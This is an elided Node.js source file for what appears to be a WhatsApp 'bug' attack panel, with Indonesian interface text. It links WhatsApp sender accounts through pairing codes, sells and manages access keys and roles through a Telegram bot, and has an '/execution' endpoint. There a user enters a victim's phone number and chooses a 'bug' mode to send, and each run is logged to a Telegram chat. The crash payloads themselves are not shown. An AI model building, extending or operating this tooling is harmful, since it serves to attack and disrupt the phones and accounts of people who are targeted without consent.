...
function loadUserSessions() {
  try {
    ...
    console.error("[SESSION] ❌ Error loading user_sessions.json:", error);
    return {};
  }
}
...
function saveUserSessions(sessions) {
  try {
    ...
    console.error("❌ Gagal menyimpan user_sessions.json:", error);
    return false;
  }
}
...
function healthCheck() {
  ...
  console.log(chalk.bold("\n📊  [HEALTH CHECK] Active: " + activeCount + "/" + totalRegistered + " sessions"));
  if (totalRegistered > 0 && activeCount < totalRegistered) {
    const missing = totalRegistered - activeCount;
    console.log(chalk.yellow("   ⚠️ Missing " + missing + " sessions, attempting to reload..."));
...
async function startupReload() {
  reloadAttempts++;
  console.log(chalk.yellow.bold("\n[STARTUP] 🔄 Reload attempt " + reloadAttempts + "/" + maxReloadAttempts));
  const allSessions = loadUserSessions();
  ...
  setTimeout(() => {
    ...
    console.log(chalk.blue("\n[STARTUP] 📊 Current active sessions: " + currentActive));
    if (currentActive === 0 && reloadAttempts < maxReloadAttempts) {
      console.log(chalk.yellow.bold("[STARTUP] 🔄 No active sessions, retrying... (" + reloadAttempts + "/" + maxReloadAttempts + ")"));
      setTimeout(() => {
        startupReload();
      }, 10000);
      ...
      console.log(chalk.green.bold("[STARTUP] ✅ SUCCESS: " + currentActive + " sessions active"));
    }
  }, 30000);
}
...
async function autoReloadAllSessions() {
  ...
  setTimeout(() => {
    ...
    console.log(chalk.green("   ✅ Successfully reloaded: " + success));
    console.log(chalk.yellow("   ⚠️ Failed to reload: " + failed));
    console.log(chalk.blue("   🔗 Total active sessions: " + activeConnections.size));
  }, 15000);
}
  ...
  try {
    ...
    return new Promise((resolve, reject) => {
      ...
      sock.ev.on("connection.update", async update => {
        ...
        if (connection === "close") {
          ...
          if (statusCode === DisconnectReason.loggedOut) {
            ...
            if (fs.existsSync(deviceDir)) {
              try {
                ...
                console.error("[" + username + "] ❌ Failed to delete session folder:", error.message);
              }
            }
            const allSessions = loadUserSessions();
          ...
          if (statusCode === DisconnectReason.restartRequired || statusCode === DisconnectReason.timedOut || statusCode === DisconnectReason.connectionLost) {
            if (reconnectAttempts < maxReconnectAttempts) {
              ...
              console.log(chalk.green.bold("🔄 Reconnect attempt " + reconnectAttempts + " for " + number));
              setTimeout(async () => {
                try {
        ...
        if (connection === "connecting") {
          ...
          if (!fs.existsSync(deviceDir + "/creds.json") && !pairingRequested) {
            ...
            setTimeout(async () => {
              try {
                console.log(chalk.green("[" + username + "] 📞 Requesting pairing code for " + number + "..."));
                sendEventToUser(username, {
                  type: "status",
                ...
                const pairingData = {
                  ...
                  instructions: ["1. Buka WhatsApp di HP Anda", "2. Tap ⋮ (titik tiga) > Linked Devices > Link a Device", "3. Masukkan kode pairing berikut:", "KODE: " + formattedCode, "4. Kode berlaku 30 detik!"]
                };
                ...
                console.error("[" + username + "] ❌ Error requesting pairing code:", error.message);
                sendEventToUser(username, {
                  type: "error",
      ...
      sock.ev.on("connection.close", () => {
        console.log(chalk.green("[" + username + "] 🔌 Connection closed event for " + number));
        activeConnections.delete(number);
      });
      timeoutTimer = setTimeout(() => {
        if (!isConnected) {
          console.log(chalk.red("[" + username + "] ⏱️ Connection timeout for " + number));
          sendEventToUser(username, {
            type: "error",
...
bot.command("start", async ctx => {
  ...
  const infoMsg = await ctx.reply("⏳ <b>Silakan pilih menu di polling di atas!</b>\n<i>Polling akan otomatis dihapus setelah dipilih</i>", {
    parse_mode: "HTML"
  });
...
bot.command("ckey", async ctx => {
  ...
  const pollMsg = await ctx.replyWithPoll("🔑 Pilih Role untuk " + username, ["👑 Owner", "🔧 Admin", "👤 User", "❌ Cancel"], {
    is_anonymous: false,
    type: "regular",
    allows_multiple_answers: false,
    open_period: 60
  });
  const infoMsg = await ctx.reply("⏳ <b>Silakan pilih role di polling di atas!</b>\n<i>Polling akan otomatis dihapus setelah dipilih</i>", {
    parse_mode: "HTML"
  });
...
bot.command("listkey", async ctx => {
  ...
  pollOptions.push("📋 Lihat Semua");
  pollOptions.push("❌ Batal");
  const pollMsg = await ctx.replyWithPoll("👥 Pilih User untuk Detail", pollOptions, {
    is_anonymous: false,
    type: "regular",
    allows_multiple_answers: false,
    open_period: 60
  });
  const infoMsg = await ctx.reply("⏳ <b>Silakan pilih user di polling di atas!</b>\n<i>Polling akan otomatis dihapus setelah dipilih</i>", {
    parse_mode: "HTML"
  });
  ckeyPolls.set(pollMsg.poll.id, {
    adminId: userId,
...
bot.command("delkey", async ctx => {
  ...
  if (!username) {
    ...
    const pollOptions = users.slice(0, 10).map((user, index) => index + 1 + ". " + user.username + " (" + (user.role || "user") + ")");
    pollOptions.push("❌ Batal");
    const pollMsg = await ctx.replyWithPoll("🗑️ Pilih User untuk Dihapus", pollOptions, {
      is_anonymous: false,
      type: "regular",
      allows_multiple_answers: false,
      open_period: 60
    ...
    if (userIndex === -1) {
      return ctx.reply("✗ User `" + targetUsername + "` tidak ditemukan.", {
        parse_mode: "HTML"
      });
    }
    users.splice(userIndex, 1);
    saveUsers(users);
    ctx.reply("✅ <b>User berhasil dihapus</b>\n\n" + ("<b>Username:</b> <code>" + targetUsername + "</code>"), {
      parse_mode: "HTML"
    });
  }
});
  ...
  try {
    ...
    if (startPollData) {
      ...
      if (selectedOption === 0) {
        ...
        responseText = "<blockquote>📊 SESSION STATUS</blockquote>\n\n";
        responseText += "<b>✅ Active Sessions:</b> " + activeCount + "\n";
        responseText += "<b>👥 Registered Users:</b> " + totalUsers + "\n";
        responseText += "<b>📞 Total Senders:</b> " + totalSenders + "\n\n";
        if (totalUsers > 0) {
          responseText += "<b>📋 User Details:</b>\n";
          let count = 1;
        ...
        responseText = "❌ <b>Polling dibatalkan</b>\n\nGunakan /start untuk memulai kembali.";
      }
      if (responseText) {
    ...
    if (ckeyPollData) {
      ...
      if (ckeyPollData.type === "listkey") {
        if (selectedOption === ckeyPollData.users.length) {
          let allUsersText = "<b>📋 DAFTAR SEMUA USER</b>\n\n";
          ...
          await ctx.telegram.sendMessage(ckeyPollData.adminId, "❌ <b>Dibatalkan</b>", {
            parse_mode: "HTML"
          });
        } else {
      ...
      if (ckeyPollData.type === "delkey") {
        if (selectedOption === ckeyPollData.users.length) {
          await ctx.telegram.sendMessage(ckeyPollData.adminId, "❌ <b>Penghapusan dibatalkan</b>", {
            parse_mode: "HTML"
          });
        } else {
          const selectedIndex = selectedOption;
      ...
      if (ckeyPollData.type === "ckey") {
        ...
        switch (selectedOption) {
          ...
          case 3:
            ckeyPolls.delete(pollId);
            await ctx.telegram.sendMessage(ckeyPollData.adminId, "❌ <b>Pembuatan key dibatalkan</b>", {
              parse_mode: "HTML"
            });
            return;
        }
        ...
        if (!saveResult) {
          await ctx.telegram.sendMessage(ckeyPollData.adminId, "❌ <b>Gagal menyimpan data user!</b>", {
            parse_mode: "HTML"
          });
          ckeyPolls.delete(pollId);
          return;
...
bot.command("sessions", async ctx => {
  ...
  const keyboard = Markup.inlineKeyboard([[Markup.button.callback("🔄 Refresh", "session_status")], [Markup.button.callback("🏠 Main Menu", "back_to_main")]]);
  const replyOptions = {
    parse_mode: "HTML",
...
bot.command("myrole", async ctx => {
  ...
  const keyboard = Markup.inlineKeyboard([[Markup.button.callback("🔑 Buat Key", "quick_listkey")], [Markup.button.callback("📋 List Keys", "quick_listkey")], [Markup.button.callback("🏠 Main Menu", "back_to_main")]]);
  await ctx.reply("\n👤 <b>Role Information</b>\n\n🆔 <b>User:</b> " + userName + "\n🎭 <b>Bot Role:</b> " + role + "\n💻 <b>User ID:</b> <code>" + userId + "</code>\n\n" + (role === "Owner" ? "🔓 <i>Anda memiliki akses penuh ke semua fitur</i>" : role === "Admin" ? "🔐 <i>Anda memiliki akses terbatas</i>" : "🔒 <i>Akses terbatas untuk user biasa</i>") + "\n  ", {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup
  });
});
...
bot.command("addowner", ctx => {
  ...
  if (accessData.owners.includes(targetId)) {
    return ctx.reply("✗ Already an owner.");
  }
  accessData.owners.push(targetId);
  saveAkses(accessData);
  ctx.reply("✓ New owner added: " + targetId);
});
...
bot.command("delowner", ctx => {
  ...
  const accessData = loadAkses();
  if (!accessData.owners.includes(targetId)) {
    return ctx.reply("✗ Not the owner.");
  }
  accessData.owners = accessData.owners.filter(id => id !== targetId);
  saveAkses(accessData);
  ctx.reply("✓ Owner ID " + targetId + " was successfully deleted.");
});
...
app.get("/", (req, res) => {
  ...
  const loginPath = path.join(__dirname, "Publik-html", "Login.html");
  fs.readFile(loginPath, "utf8", (err, data) => {
    if (err) {
      return res.status(500).send("✗ Gagal baca Login.html");
    }
    res.send(data);
  });
});
...
app.get("/dashboard", requireAuth, (req, res) => {
  ...
  res.setHeader("Expires", "0");
  const now = Date.now();
  const dashboardPath = path.join(__dirname, "Publik-html", "dashboard.html");
...
app.get("/execution", async (req, res) => {
  try {
    ...
    if (justExecuted && target && mode) {
      ...
      return res.send(generateExecutionPage("✓ S U C C E S", {
        target: target,
    ...
    const userSenders = allSessions[sessionUser] || [];
    const activeSenders = userSenders.filter(num => activeConnections.has(num));
    return res.send(generateExecutionPage("🟥 Ready", {
      message: "Masukkan nomor target dan pilih mode bug",
      activeSenders: activeSenders
    }, true, user, "", mode));
  } catch (error) {
    console.error("❌ Fatal error di /execution:", error);
...
app.post("/execution", requireAuth, async (req, res) => {
  try {
    ...
    if (!availableModes.includes(mode)) {
      return res.status(400).json({
        success: false,
        error: "⚙️ Mode '" + mode + "' tidak valid. Pilih: " + availableModes.join(", ")
      });
    }
    ...
    try {
      ...
      const telegramMessage = "\n<blockquote>⚡ <b>NEW EXECUTION - " + country.toUpperCase() + "</b></blockquote>\n\n👤 <b>User:</b> <code>" + sessionUser + "</code>\n📞 <b>Sender:</b> <code>" + firstActiveSender + "</code>\n🎯 <b>Target:</b> <code>" + cleanNumber + "</code> (" + country + ")\n📱 <b>Mode:</b> " + bugName + "\n🔢 <b>Country Code:</b> " + cleanNumber.substring(0, 3) + "...\n⏰ <b>Time:</b> " + new Date().toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta"
      }) + "\n✅ <b>Status:</b> SUCCESS - Sent to server\n\n<i>Powered by Interclose • Phone Helper Detection</i>";
      const telegramData = {
        chat_id: telegramChatId,
        text: telegramMessage,
        parse_mode: "HTML"
      };
      axios.post("https://api.telegram.org/bot" + telegramBotToken + "/sendMessage", telegramData).catch(err => console.error("❌ Gagal kirim log Telegram:", err.message));
      lastExecuted = Date.now();
      res.json({
        success: true,
        message: "✅ Bug berhasil dikirim ke " + cleanNumber,
        details: {
          target: cleanNumber,
          mode: mode,
          bugName: bugName,
      ...
      axios.post("https://api.telegram.org/bot" + telegramBotToken + "/sendMessage", telegramErrorData).catch(err => console.error("❌ Gagal kirim error log Telegram:", err.message));
      const errorResponse = {
        success: false,
    ...
    axios.post("https://api.telegram.org/bot" + telegramBotToken + "/sendMessage", telegramFatalData).catch(err => console.error("❌ Gagal kirim fatal log Telegram:", err.message));
    res.status(500).json({
      success: false,
...
app.get("/my-senders", requireAuth, (req, res) => {
  const senderPath = path.join(__dirname, "Publik-html", "sender.html");
...
app.post("/api/add-sender", requireAuth, async (req, res) => {
  ...
  try {
    ...
    connectToWhatsAppUser(sessionUser, cleanNumber, deviceDir).then(sock => {}).catch(error => {
      console.error("[" + sessionUser + "] ❌ Failed to connect sender " + cleanNumber + ":", error.message);
    });
    const response = {
      success: true,
...
app.get("/user-management", requireAuth, (req, res) => {
  const userManagementPath = path.join(__dirname, "Publik-html", "user-management.html");
...
app.get("/profile", requireAuth, (req, res) => {
  const profilePath = path.join(__dirname, "Publik-html", "profil.html");
...
app.get("/my-support", requireAuth, (req, res) => {
  const supportPath = path.join(__dirname, "Publik-html", "my-supports.html");
...
setInterval(() => {
  ...
  const allSessions = loadUserSessions();
  const totalRegistered = Object.values(allSessions).reduce((sum, arr) => sum + arr.length, 0);
  console.log("📊 Health Check: " + activeCount + "/" + totalRegistered + " sessions active");
...
const generateExecutionPage = (status = "🟥 Ready", data = {}, showForm = true, user = {}, target = "", mode = "") => {
    ...
    <div class="container">
        ...
        <main>
            ...
            <div style="text-align: center; padding: 30px;">
                <h3 style="color: var(--accent-green); margin-bottom: 15px;">✅ EXECUTION SUCCESS</h3>
